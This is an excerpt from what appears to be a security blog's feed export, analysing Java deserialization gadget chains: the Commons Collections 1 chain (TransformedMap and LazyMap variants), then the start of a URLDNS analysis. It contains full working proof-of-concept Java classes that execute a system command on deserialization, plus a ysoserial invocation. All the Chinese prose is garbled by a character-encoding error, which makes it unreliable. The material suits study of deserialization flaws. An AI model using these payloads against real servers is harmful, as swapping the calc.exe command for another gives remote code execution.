class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                           <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                           &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br></code></pre></td></tr></table></figure><h4 id="æœ€ç»ˆPOC"><a href="#æœ€ç»ˆPOC" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oss.writeObject(obj);<br>        oss.close();<br><br>        <span class="hljs-comment">// ååºåˆ—</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bari</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bari);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¹¶ä¸èƒ½æ‰§è¡ŒæˆåŠŸï¼Œè°ƒè¯•ä¸€ä¸‹ä¼šå‘ç°ã€‚<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code>æ–¹æ³•ä¸­çš„var7ä¸ºnullï¼Œæ— æ³•è§¦å‘<code>var.setValue()</code>ï¼Œä¹Ÿå°±æ— æ³•è§¦å‘Transformeråˆ©ç”¨é“¾</p><p><img src="https://img.katck.com/images/2023/05/06/68d35067077fa12091b7ffbc2ae6c7e9.png" alt="image-20230425214703430"></p><p>æŸ¥äº†ç½‘ä¸Šå¤§éƒ¨åˆ†ä»‹ç»cc1é“¾çš„æ–‡ç« éƒ½æ²¡æœ‰è¯´æ¸…æ¥šè¿™æ˜¯ä¸ºå•¥ã€‚Pç¥çš„Javaå®‰å…¨æ¼«è°ˆä¸­è¯´è¿™é‡Œç”¨äº†javaçš„æ³¨é‡Šç›¸å…³æŠ€æœ¯ï¼ˆå…·ä½“æ˜¯å•¥æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œè®°ä½æ»¡è¶³ifè¯­å¥éœ€è¦ä¸‹é¢çš„ä¸¤ä¸ªæ¡ä»¶å°±è¡Œï¼‰ï¼š</p><ul><li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯<code>Annotation</code>çš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•</li><li>è¢«<code>TransformedMap.decorate</code>ä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸º<code>Annotation</code>å­ç±»çš„æ–¹æ³•åçš„å…ƒç´ </li></ul><p>è€Œ<code>Retention</code>æ­£å¥½æœ‰ä¸€ä¸ªæ–¹æ³•åä¸º<code>value</code>ï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>Retention.class</code>ï¼ŒçœŸå¥½å¯ä»¥æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å·²ç»ä½¿ç”¨äº†<code>Retention.class</code>ï¼Œä¸ºäº†æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ç»™Mapæ”¾å…¥ä¸€ä¸ªæ˜¯<code>value</code>çš„å…ƒç´ </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">innerMap.<span class="hljs-keyword">put</span>(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æˆåŠŸè§¦å‘</p><p><img src="https://img.katck.com/images/2023/05/06/edb20387ace6149c6d3563d2212ad5bb.png" alt="image-20230425215845242"></p><h4 id="æ•´ä½“åˆ©ç”¨é“¾"><a href="#æ•´ä½“åˆ©ç”¨é“¾" class="headerlink" title="æ•´ä½“åˆ©ç”¨é“¾"></a>æ•´ä½“åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>transform<span class="hljs-constructor">Value()</span> =&gt; ChainedTransformer =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æœ€å¼€å§‹è§¦å‘çš„æ–¹æ³•å˜äº†ï¼Œä½†è¿™å¯ä»¥è‡ªåŠ¨è§¦å‘ï¼Œéå¸¸å…³é”®ã€‚</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>ysoserialä¸­ä½¿ç”¨çš„æ˜¯<code>LazyMap.get()</code>æ¥è§¦å‘<code>ChainedTransformer.transform()</code></p><p><strong>cc1éƒ¨åˆ†Gadgetï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* </span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br></code></pre></td></tr></table></figure><p>LazyMapçš„æ¼æ´è§¦å‘ç‚¹æ˜¯åœ¨getæ–¹æ³•ä¸­æ‰§è¡Œçš„<code>factory.transform</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨<code>AnnotationInvocationHandler</code>çš„readObjectæ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨Mapçš„getæ–¹æ³•</p><p>ysoserialæ‰¾åˆ°äº†<code>AnnotationInvocationHandler.invoke()</code>ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨get</p><p><img src="https://img.katck.com/images/2023/05/06/b2098071e0942e2bc1d9a6f157782f22.png" alt="image-20230506151225011"></p><p>ä½†æ˜¯å¦‚ä½•è°ƒç”¨<code>AnnotationInvocationHandler.invoke()</code>å‘¢ï¼Ÿ</p><p>ysoserialåˆ©ç”¨äº†<a href="https://aurey7.github.io/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">å¯¹è±¡ä»£ç†</a></p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>æ˜¯ä¸€ä¸ªInvocationHandlerã€‚å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ°<code>AnnotationInvocationHandler.invoke()</code>æ–¹æ³•ä¸­ï¼Œä»è€Œè§¦å‘<code>LazyMap.get()</code></p><h4 id="ä½¿ç”¨LazyMapæ„é€ åˆ©ç”¨é“¾"><a href="#ä½¿ç”¨LazyMapæ„é€ åˆ©ç”¨é“¾" class="headerlink" title="ä½¿ç”¨LazyMapæ„é€ åˆ©ç”¨é“¾"></a>ä½¿ç”¨LazyMapæ„é€ åˆ©ç”¨é“¾</h4><p>ç›´æ¥æ”¹é€ ä¸€ä¸‹ä¸Šé¢çš„TransformedMap POC</p><ol><li><p>ä½¿ç”¨LazyMapæ›¿æ¢TransformedMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure></li><li><p>å¯¹<code>sun.reflect.annotation.AnnotationInvocationHandler</code>å¯¹è±¡è¿›è¡Œä»£ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, outerMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure></li></ol><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨ AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><h4 id="æœ€ç»ˆPOC-1"><a href="#æœ€ç»ˆPOC-1" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>        <span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oss.writeObject(expMap);<br>        oss.close();<br><br>        <span class="hljs-comment">// ååºåˆ—</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bari</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bari);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Java 8u71ä¹‹åå®˜æ–¹ä¿®æ”¹äº†<code>AnnotationInvocationHandler.readObject</code>ï¼Œæ”¹åŠ¨ä¹‹åæ— æ³•ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–åçš„Mapå¯¹è±¡ï¼Œä¹Ÿå°±æ— æ³•è§¦å‘Transformeråˆ©ç”¨é“¾äº†ã€‚æ‰€ä»¥cc1åªé€‚ç”¨äºJava 8u71ä¹‹å‰çš„ç‰ˆæœ¬ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/2023/04/24/URLDNS/"/>
    <url>/2023/04/24/URLDNS/</url>
    
    <content type="html"><![CDATA[<p>åˆ†æä¸€ä¸‹URLDNSçš„è§¦å‘è¿‡ç¨‹</p><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>åœ¨2015å¹´11æœˆ6æ—¥FoxGlove Securityå®‰å…¨å›¢é˜Ÿçš„<code>@breenmachine</code> å‘å¸ƒäº†ä¸€ç¯‡é•¿åšå®¢é‡Œï¼Œå€Ÿç”¨Javaååºåˆ—åŒ–å’ŒApache Commons Collectionsè¿™ä¸€åŸºç¡€ç±»åº“å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„çœŸå®æ¡ˆä¾‹æ¥åˆ°äººä»¬çš„è§†é‡ï¼Œå„å¤§Java Web Serverçº·çº·èººæªã€‚</p><p>ysoserialå°±æ˜¯ä¸¤ä½åŸä½œè€…å†è®®é¢˜ä¸­é‡Šæ”¾å‡ºçš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥è®©ç”¨æˆ·é€‰æ‹©åˆ©ç”¨é“¾ï¼Œç”Ÿæˆååºåˆ—åŒ–åˆ©ç”¨æ•°æ®ï¼Œå°†è¿™ä¸ªæ•°æ®å‘é€ç»™ç›®æ ‡ï¼Œä»è€Œæ‰§è¡Œç”¨æˆ·é¢„å…ˆå®šä¹‰çš„å‘½ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar ysoserial-all.jar CommonsCollections1 <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNSæ˜¯ysoserialä¸­çš„ä¸€ä¸ªåˆ©ç”¨é“¾ï¼Œä½œç”¨åœ¨äºå‘èµ·ä¸€æ¬¡DNSè¯·æ±‚ï¼Œå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ¼æ´ã€‚</p><p><strong>ä¼˜ç‚¹</strong></p><ol><li>ä½¿ç”¨Javaå†…ç½®ç±»æ„é€ ï¼Œæ²¡æœ‰ç¬¬ä¸‰æ–¹åº“çš„ä¾èµ–</li><li>æ— éœ€å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</li></ol><h3 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p>ysoserialä¼šè°ƒç”¨<code>URLDNS</code>ç±»çš„<code>getObject</code>æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æœ€åè¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè¿™é‡Œæ˜¯<code>HashMap</code></p><p>ysoserialä¹Ÿåœ¨æ³¨é‡Šä¸­ç»™å‡ºäº†åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()<br></code></pre></td></tr></table></figure><p>è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•å°±æ˜¯<code>HashMap</code>ç±»çš„<code>readObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <br>    ...<br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨äº†<code>hash</code>å‡½æ•°è®¡ç®—HashMapçš„é”®åhash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">putVal(hash(key), key, value, <span 